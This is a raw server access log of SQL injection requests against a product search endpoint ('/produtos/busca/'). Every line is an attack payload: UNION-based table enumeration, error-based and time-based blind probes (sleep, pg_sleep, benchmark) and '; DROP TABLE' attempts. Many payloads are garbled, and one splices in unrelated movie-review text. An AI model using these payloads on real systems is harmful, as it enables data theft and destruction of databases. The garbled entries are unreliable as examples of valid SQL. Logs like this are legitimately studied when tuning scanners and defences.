Servidor rodando em http://0.0.0.0:8000
172.18.0.1 - GET /produtos/busca/?nome=1%22+%29+%29+as+zbkj+where+2100+%3D+2100+and+1570+%3D+convert+%28+int%2C+%28+select+char+%28+113+%29+%2Bchar+%28+113+%29+%2Bchar+%28+112+%29+%2Bchar+%28+106+%29+%2Bchar+%28+113+%29+%2B+%28+select+%28+case+when+%28+1570+%3D+1570+%29+then+char+%28+49+%29+else+char+%28+48+%29+end+%29+%29+%2Bchar+%28+113+%29+%2Bchar+%28+122&categoria=1%22+%29+%29+as+zbkj+where+2100+%3D+2100+and+1570+%3D+convert+%28+int%2C+%28+select+char+%28+113+%29+%2Bchar+%28+113+%29+%2Bchar+%28+112+%29+%2Bchar+%28+106+%29+%2Bchar+%28+113+%29+%2B+%28+select+%28+case+when+%28+1570+%3D+1570+%29+then+char+%28+49+%29+else+char+%28+48+%29+end+%29+%29+%2Bchar+%28+113+%29+%2Bchar+%28+122 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%3B%28+cable+nec%29+like+%27%24%27+%2C%40+site_tacc_a&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%3B%28+cable+nec%29+like+%27%24%27+%2C%40+site_tacc_a HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+%2C+SELECT+vErSion+%28+%29+%2Cversion+%28+%29+%2C0x1%2CveNAIL_LIKe+%27aD%2F%2AVVV%2A%2F%27vbAD%2CRUBed_&categoria=%27+UNION+SELECT+%28+%2C+SELECT+vErSion+%28+%29+%2Cversion+%28+%29+%2C0x1%2CveNAIL_LIKe+%27aD%2F%2AVVV%2A%2F%27vbAD%2CRUBed_ HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+S&categoria=%27+UNION+SELECT+S HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charally+tyve_all%27+%29+%3C&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charally+tyve_all%27+%29+%3C HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+table_name%27+%29+--&categoria=%27+UNION+SELECT+table_name%27+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+verseoncmane+%29+%3C%40%3Ct__bere_demine%27+%27TvEe%27%2CNELT%27+%27+--&categoria=%27+UNION+SELECT+%40+verseoncmane+%29+%3C%40%3Ct__bere_demine%27+%27TvEe%27%2CNELT%27+%27+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+%2C+users%2Cgverpabp_race%29%3Ball+this+in+1.1%2C1%2C5+%28+ELECT+11%2C+%28+1&categoria=%27+UNION+SELECT+%28+%2C+users%2Cgverpabp_race%29%3Ball+this+in+1.1%2C1%2C5+%28+ELECT+11%2C+%28+1 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+table_sameid_all_vestible+%29+%3D+%27&categoria=%27+UNION+SELECT+%28+table_sameid_all_vestible+%29+%3D+%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40%40+--&categoria=%27+UNION+SELECT+%40%40+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+table_sermet%2Cable_same+%29+%2C+and+1+%3D+1&categoria=%27+UNION+SELECT+%28+table_sermet%2Cable_same+%29+%2C+and+1+%3D+1 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28count+%28%29+%2C+%29+%2Cevertime+%28+%271%2C1%2C0o1101+%29+%2B1+1+%29+%29+%7C%7C%27&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28count+%28%29+%2C+%29+%2Cevertime+%28+%271%2C1%2C0o1101+%29+%2B1+1+%29+%29+%7C%7C%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+table_schema%2Ctable_name+FROM+inall%24+%3B%28+1%2C1%2Cbenchmark+%28&categoria=%27+UNION+SELECT+table_schema%2Ctable_name+FROM+inall%24+%3B%28+1%2C1%2Cbenchmark+%28 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+table_samerial%2Cles+t&categoria=%27+UNION+SELECT+%28+table_samerial%2Cles+t HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+table_schema%2Ctable_name+FROM+iname_1%3B&categoria=%27+UNION+SELECT+table_schema%2Ctable_name+FROM+iname_1%3B HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+verseoncmant+iDe+FRoM+tuble%3BWhere+0x1+%3D+%28SELECT+%28SELECT+%28SELECT+0x1%29%29%29%29+uNiON+select+2%2Cversion+%28+%29+--+1&categoria=%27+UNION+SELECT+%40+verseoncmant+iDe+FRoM+tuble%3BWhere+0x1+%3D+%28SELECT+%28SELECT+%28SELECT+0x1%29%29%29%29+uNiON+select+2%2Cversion+%28+%29+--+1 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+usersigh%2C+hasnane+%29+%2C+1%2C1%2C1%2C1%3B+%29+%29+--&categoria=%27+UNION+SELECT+%28+usersigh%2C+hasnane+%29+%2C+1%2C1%2C1%2C1%3B+%29+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+userschame+cantore+name+%3D+%27a&categoria=%27+UNION+SELECT+%40+%2C+userschame+cantore+name+%3D+%27a HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmatecbumtable+%28+%29+%29+and+%27i%27+%3D+%27i&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmatecbumtable+%28+%29+%29+and+%27i%27+%3D+%27i HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Calectame+%27%29+%2C+%27lime%27+%29+%2C%27beva&categoria=%27+UNION+SELECT+%40+%2C+users%2Calectame+%27%29+%2C+%27lime%27+%29+%2C%27beva HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+table_samerial%2Cname_NiML%2C+%28+%27SELECT+UPEr%2F%2A%2A%2F+%28+SEleCt+0x1%29+AND+%27D%27%3C%3E%27D%27&categoria=%27+UNION+SELECT+%28+table_samerial%2Cname_NiML%2C+%28+%27SELECT+UPEr%2F%2A%2A%2F+%28+SEleCt+0x1%29+AND+%27D%27%3C%3E%27D%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+table_samerial%2Cname_NibL%2C+SY%2CiNT%24%2C%24%2CBaNee+%29+%2C+aND+%22Te%22%3D%22T%22%23%22+oR+0x0+--&categoria=%27+UNION+SELECT+%28+table_samerial%2Cname_NibL%2C+SY%2CiNT%24%2C%24%2CBaNee+%29+%2C+aND+%22Te%22%3D%22T%22%23%22+oR+0x0+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade%2Ccall+regenpease_ther+i&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade%2Ccall+regenpease_ther+i HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%3B%28+1%2Ccult%27+%29+%3B%2F%2A%2A%2F+%29+%29+%3B&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%3B%28+1%2Ccult%27+%29+%3B%2F%2A%2A%2F+%29+%29+%3B HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+verseoncmant+ide+Lice+table+NAte+%29&categoria=%27+UNION+SELECT+%40+verseoncmant+ide+Lice+table+NAte+%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+-+Table_name%2C+DROM+intor+gevarion_geramend+%29+%29&categoria=%27+UNION+SELECT+-+Table_name%2C+DROM+intor+gevarion_geramend+%29+%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28chars+ly%24%3B%2Cly%2C+%29+%27%2F%2A%2A%2F&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28chars+ly%24%3B%2Cly%2C+%29+%27%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+table_schema%2Ctable_name+FROM+inam%24%24&categoria=%27+UNION+SELECT+table_schema%2Ctable_name+FROM+inam%24%24 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+S+--&categoria=%27%3B+DROP+TABLE+S+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+Se&categoria=%27%3B+DROP+TABLE+Se HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+1+--&categoria=%27%3B+DROP+TABLE+1+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+VET%2C+is+for+the+most+obvious+film+about+any+good+hour+and+it+my+wife+and+you+can+save+yourself+a+favor+in+the+main+character.+The+story+could+spent+my+lifethie+garbage+and+clearly+about+the+story+of+nor+of+the+Colordis%2C+which+has+a+pleasantl&categoria=%27%3B+DROP+TABLE+VET%2C+is+for+the+most+obvious+film+about+any+good+hour+and+it+my+wife+and+you+can+save+yourself+a+favor+in+the+main+character.+The+story+could+spent+my+lifethie+garbage+and+clearly+about+the+story+of+nor+of+the+Colordis%2C+which+has+a+pleasantl HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%22+OR+%221%22%3D%221%22+or+%28SELECT+0%29+AND+True%23%29+%29+OR+%28+select+%2A+from+%28+seLEcT+%28+slEeP+%28+%28SeLEcT+%28SElect+%28SELECT+%28SELECT+%28SELECT+%28SELECT+%28SELECT+0%29%29%29%29%29%29%29+%29+%29+%29+FzNO+%29+and+%27%25%27+%3D+%27&categoria=%22+OR+%221%22%3D%221%22+or+%28SELECT+0%29+AND+True%23%29+%29+OR+%28+select+%2A+from+%28+seLEcT+%28+slEeP+%28+%28SeLEcT+%28SElect+%28SELECT+%28SELECT+%28SELECT+%28SELECT+%28SELECT+0%29%29%29%29%29%29%29+%29+%29+%29+FzNO+%29+and+%27%25%27+%3D+%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%22+OR+%221%22%3D%221+--&categoria=%22+OR+%221%22%3D%221+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%22+OR+%221%22%3D%221%22+or+1+%3D+1+--&categoria=%22+OR+%221%22%3D%221%22+or+1+%3D+1+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+%29+as+myyh+where+5116+%3D+5116+or+7427+%3D+dbms_pipe.receive_message+%28+chr+%28+116+%29+%7C%7Cchr+%28+87+%29+%7C%7Cchr+%28+90+%29+%7C%7Cchr+%28+109+%29+%2C5+%29+--&categoria=1+%29+%29+as+myyh+where+5116+%3D+5116+or+7427+%3D+dbms_pipe.receive_message+%28+chr+%28+116+%29+%7C%7Cchr+%28+87+%29+%7C%7Cchr+%28+90+%29+%7C%7Cchr+%28+109+%29+%2C5+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+and+make_set+%28+4551+%3D+6487%2C6487+%29+and+%28+%27jnqa%27+%3D+%27jnqa&categoria=1%27+%29+and+make_set+%28+4551+%3D+6487%2C6487+%29+and+%28+%27jnqa%27+%3D+%27jnqa HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+where+1646+%3D+1646+or+9643+%3D+%28+select+count+%28+%2A+%29+from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3+%29+--&categoria=1%27+%29+where+1646+%3D+1646+or+9643+%3D+%28+select+count+%28+%2A+%29+from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+rlike+%28+select+%28+case+when+%28+7689+%3D+7689+%29+then+1+else+0x28+end+%29+%29+and+%28+%28+%27ltki%27+%3D+%27ltki&categoria=1%27+%29+%29+rlike+%28+select+%28+case+when+%28+7689+%3D+7689+%29+then+1+else+0x28+end+%29+%29+and+%28+%28+%27ltki%27+%3D+%27ltki HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=0X6%27+%29+AS+QCPE+wHEre+%28SelEcT+1105%29+likE+%28SELECt+0x203e%29+and+%28Select+%28SElEct+0x1f89%29%29+like+CTxSyS.drITHSx.SN+%28+%28SEleCt+%28SELeCt+%28SeLEct+0x15a7%29%29%29%2C+%28+cHr+%28+%28SELect+0X71%29+%29+OR+cHR+%28+0X0o0x7a+%29+OR+cHR+%28+0X0o116+%29+OR+cHR+%28+%28SELECT+%28S%29%29%29%29&categoria=0X6%27+%29+AS+QCPE+wHEre+%28SelEcT+1105%29+likE+%28SELECt+0x203e%29+and+%28Select+%28SElEct+0x1f89%29%29+like+CTxSyS.drITHSx.SN+%28+%28SEleCt+%28SELeCt+%28SeLEct+0x15a7%29%29%29%2C+%28+cHr+%28+%28SELect+0X71%29+%29+OR+cHR+%28+0X0o0x7a+%29+OR+cHR+%28+0X0o116+%29+OR+cHR+%28+%28SELECT+%28S%29%29%29%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%25%22%29%29%3Bselect+count%28%2A%29+from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5+--&categoria=1%25%22%29%29%3Bselect+count%28%2A%29+from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+%29+as+queb+where+2449+%3D+2449+union+all+select+null%2Cnull%23&categoria=1+%29+%29+as+queb+where+2449+%3D+2449+union+all+select+null%2Cnull%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%25%22+%29+%29+and+updatexml+%28+3393%2Cconcat+%28+0x2e%2C0x7171706a71%2C+%28+select+%28+elt+%28+3393+%3D+3393%2C1+%29+%29+%29+%2C0x717a767a71+%29+%2C1161+%29+and+%28+%28+%22%25%22+%3D+%22&categoria=1%25%22+%29+%29+and+updatexml+%28+3393%2Cconcat+%28+0x2e%2C0x7171706a71%2C+%28+select+%28+elt+%28+3393+%3D+3393%2C1+%29+%29+%29+%2C0x717a767a71+%29+%2C1161+%29+and+%28+%28+%22%25%22+%3D+%22 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+as+mzxo+where+2102+%3D+2102+and+9198+%3D+9198+--&categoria=1%27+%29+as+mzxo+where+2102+%3D+2102+and+9198+%3D+9198+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22+%29+%29+and+6969+%3D+%28+select+6969+from+pg_sleep+%28+5+%29+%29+and+%28+%28+%22cowu%22+like+%22cowu&categoria=1%22+%29+%29+and+6969+%3D+%28+select+6969+from+pg_sleep+%28+5+%29+%29+and+%28+%28+%22cowu%22+like+%22cowu HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22+%29+as+uyms+where+6210+%3D+6210+and+6055+%3D+ctxsys.drithsx.sn+%28+6055%2C+%28+chr+%28+113+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+112+%29+%7C%7Cchr+%28+106+%29+%7C%7Cchr+%28+113+%29+%7C%7C+%28+select+%28+case+when+%28+6055+%3D+6055+%29+then+1+else+0+end+%29+from+dual&categoria=1%22+%29+as+uyms+where+6210+%3D+6210+and+6055+%3D+ctxsys.drithsx.sn+%28+6055%2C+%28+chr+%28+113+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+112+%29+%7C%7Cchr+%28+106+%29+%7C%7Cchr+%28+113+%29+%7C%7C+%28+select+%28+case+when+%28+6055+%3D+6055+%29+then+1+else+0+end+%29+from+dual HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+as+tbve+where+4828+%3D+4828&categoria=1+%29+as+tbve+where+4828+%3D+4828 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27%7C%7C+%28+select+%27nbfo%27+where+8053+%3D+8053+or+2367+%3D+%28+select+count+%28+%2A+%29+from+rdb%24fields+as+t1%2Crdb%24types+as+t2%2Crdb%24collations+as+t3%2Crdb%24functions+as+t4+%29+--&categoria=1%27%7C%7C+%28+select+%27nbfo%27+where+8053+%3D+8053+or+2367+%3D+%28+select+count+%28+%2A+%29+from+rdb%24fields+as+t1%2Crdb%24types+as+t2%2Crdb%24collations+as+t3%2Crdb%24functions+as+t4+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-1593+%29+as+gxfm+where+3692+%3D+3692+union+all+select+3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3&categoria=-1593+%29+as+gxfm+where+3692+%3D+3692+union+all+select+3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3629%2C3 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+%29+as+xyuy+where+6894+%3D+6894+--&categoria=1+%29+%29+as+xyuy+where+6894+%3D+6894+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+as+gqgd+where+2325+%3D+2235+and+2388+%3D+benchmark+%28+5000000%2Cmd5+%28+0x6d457153+%29+%29+%23&categoria=1%27+%29+as+gqgd+where+2325+%3D+2235+and+2388+%3D+benchmark+%28+5000000%2Cmd5+%28+0x6d457153+%29+%29+%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27%29%29+as+hbdi+where+6758%3D6758+and+elt%281210%3D1210%2Csleep%285%29%29+--&categoria=1%27%29%29+as+hbdi+where+6758%3D6758+and+elt%281210%3D1210%2Csleep%285%29%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+where+1093%3D1093+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull+--&categoria=1%27+where+1093%3D1093+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+as+wqem+where+3728+%3D+3728&categoria=1%27+%29+%29+as+wqem+where+3728+%3D+3728 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+as+cpwx+where+5378+%3D+5378+rlike+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+vwyq+%29+%23+--&categoria=1%27+%29+%29+as+cpwx+where+5378+%3D+5378+rlike+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+vwyq+%29+%23+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+as+sjmt+where+6541+%3D+6541+or+8421+%3D+%28+select+count+%28+%2A+%29+from+generate_series+%28+1%2C5000000+%29+%29+--&categoria=1%27+%29+as+sjmt+where+6541+%3D+6541+or+8421+%3D+%28+select+count+%28+%2A+%29+from+generate_series+%28+1%2C5000000+%29+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+in+boolean+mode+%29+and+6414+%3D+%28+select+count+%28+%2A+%29+from+rdb%24fields+as+t1%2Crdb%24types+as+t2%2Crdb%24collations+as+t3%2Crdb%24functions+as+t4+%29+%23+dwha&categoria=1%27+in+boolean+mode+%29+and+6414+%3D+%28+select+count+%28+%2A+%29+from+rdb%24fields+as+t1%2Crdb%24types+as+t2%2Crdb%24collations+as+t3%2Crdb%24functions+as+t4+%29+%23+dwha HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+and+2853+%3D+cast+%28+%28+chr+%28+113+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+112+%29+%7C%7Cchr+%28+106+%29+%7C%7Cchr+%28+113+%29+%29+%7C%7C+%28+select+%28+case+when+%28+2853+%3D+2853+%29+then+1+else+0+end+%29+%29+%3A%3Atext%7C%7C+%28+chr+%28+113+%29+%7C%7Cchr+%28+122+%29+%7C%7Cchr+%28+118+%29+%7C%7Cchr+%28+122+%29+%7C%7Cchr+%28+113+%29&categoria=1%27+%29+%29+and+2853+%3D+cast+%28+%28+chr+%28+113+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+112+%29+%7C%7Cchr+%28+106+%29+%7C%7Cchr+%28+113+%29+%29+%7C%7C+%28+select+%28+case+when+%28+2853+%3D+2853+%29+then+1+else+0+end+%29+%29+%3A%3Atext%7C%7C+%28+chr+%28+113+%29+%7C%7Cchr+%28+122+%29+%7C%7Cchr+%28+118+%29+%7C%7Cchr+%28+122+%29+%7C%7Cchr+%28+113+%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22+%29+where+2570+%3D+2570+and+3707+%3D+%28+select+count+%28+%2A+%29+from+sysibm.systables+as+t1%2Csysibm.systables+as+t2%2Csysibm.systables+as+t3+%29+--&categoria=1%22+%29+where+2570+%3D+2570+and+3707+%3D+%28+select+count+%28+%2A+%29+from+sysibm.systables+as+t1%2Csysibm.systables+as+t2%2Csysibm.systables+as+t3+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22+%29+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull+--&categoria=1%22+%29+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22+%29+%29+as+lnlq+where+6593+%3D+6593+or+extractvalue+%28+1297%2Cconcat+%28+0x5c%2C0x7171706a71%2C+%28+select+%28+elt+%28+7297+%3D+7297%2C1+%29+%29+%29+%2C0x717a767a71+%29+%29+--&categoria=1%22+%29+%29+as+lnlq+where+6593+%3D+6593+or+extractvalue+%28+1297%2Cconcat+%28+0x5c%2C0x7171706a71%2C+%28+select+%28+elt+%28+7297+%3D+7297%2C1+%29+%29+%29+%2C0x717a767a71+%29+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27%7C%7C+%28+select+%27fmss%27+from+dual+where+7025+%3D+7025+or+8421+%3D+%28+select+count+%28+%2A+%29+from+generate_series+%28+1%2C5000000+%29+%29+%29+%2B%27&categoria=1%27%7C%7C+%28+select+%27fmss%27+from+dual+where+7025+%3D+7025+or+8421+%3D+%28+select+count+%28+%2A+%29+from+generate_series+%28+1%2C5000000+%29+%29+%29+%2B%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-7202%25%22+%29+%29+union+all+select+2901%23&categoria=-7202%25%22+%29+%29+union+all+select+2901%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=0O1%25%22+%29+%29+And+%28seLECT+3502%29+iN+%28+%28+cHar+%28+0x01+%29+%2F%2A+%2A%2F+or+cHar+%28+%28sELect+%28sELeCT+0o102%29%29+%29+Or+cHAr+%28+%28sELect+%28seleCT+%28SeleCT+0X1D8%29%29%29+%29+Or+cHar+%28+%28sELeCT+0B0B0x0b11010011011110101111101011011011011101101110111011001110010001&categoria=0O1%25%22+%29+%29+And+%28seLECT+3502%29+iN+%28+%28+cHar+%28+0x01+%29+%2F%2A+%2A%2F+or+cHar+%28+%28sELect+%28sELeCT+0o102%29%29+%29+Or+cHAr+%28+%28sELect+%28seleCT+%28SeleCT+0X1D8%29%29%29+%29+Or+cHar+%28+%28sELeCT+0B0B0x0b11010011011110101111101011011011011101101110111011001110010001 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+%29+or+8466+%3D+benchmark+%28+5000000%2Cmd5+%28+0x694a4745+%29+%29+and+%28+%28+%28+%27tqeo%27+%3D+%27tqoe&categoria=1%27+%29+%29+%29+or+8466+%3D+benchmark+%28+5000000%2Cmd5+%28+0x694a4745+%29+%29+and+%28+%28+%28+%27tqeo%27+%3D+%27tqoe HTTP/1.1
